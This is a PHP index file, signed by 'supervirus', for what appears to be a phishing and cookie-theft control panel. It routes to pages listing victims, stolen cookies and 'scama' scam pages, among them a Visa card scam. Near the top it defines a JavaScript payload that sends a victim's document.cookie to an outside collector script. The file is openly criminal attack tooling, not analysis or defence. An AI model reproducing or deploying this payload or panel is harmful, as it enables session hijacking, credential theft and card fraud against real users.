<?
// ################################
// #                                                             
// #  ======== Programming By supervirus ===========  
// #
// #    The Scripet Progeramed By super virus 
// #
// #  Copyright © 2011 super virus . All Rights Reserved. 
// #
// #  If you want any support vist this site.           
// #      https://www.facebook.com/l0ldz 
// #
// ################################
ob_start();
$do = trim($_GET['do']);
$link_scama_visa = 'visa/?i=';
$user_coockies_code = '<script>javascript:void(document.location="http://myste/c.php?url=[site_victime_coockies]&u=[user_id]&c="+document.cookie);</script>';
$disc_link_scama_visa = 'Scama Of Visa Card Here ';
$c = $_POST['c'];

$type = trim($_GET['type']);
$method = trim($_GET['method']);
$u_id = intval($_GET['u_id']);
$id = intval($_GET['id']);
require_once('File4is/connect.php');
require_once('File4is/function.php');
require_once('File4is/header.php');
switch($do){
	case '':
		include ('File4is/home.php');
	break;
	case 'users':
		include ('File4is/users.php');
	break;
	case 'victims':
		include ('File4is/victims.php');
	break;
	case 'scama':
		include ('File4is/scama.php');
	break;
	case 'register':
		include ('File4is/register.php');
	break;
	case 'show_coockie':
		include ('File4is/show_coockie.php');
	break;
	case 'coockie':
		include ('File4is/coockie.php');
	break;
	case 'page':
		include ('File4is/page.php');
	break;
	default:
		include ('File4is/no_page.php');
	break;
}
require_once('File4is/home_end.php');
require_once('File4is/footer.php');
?>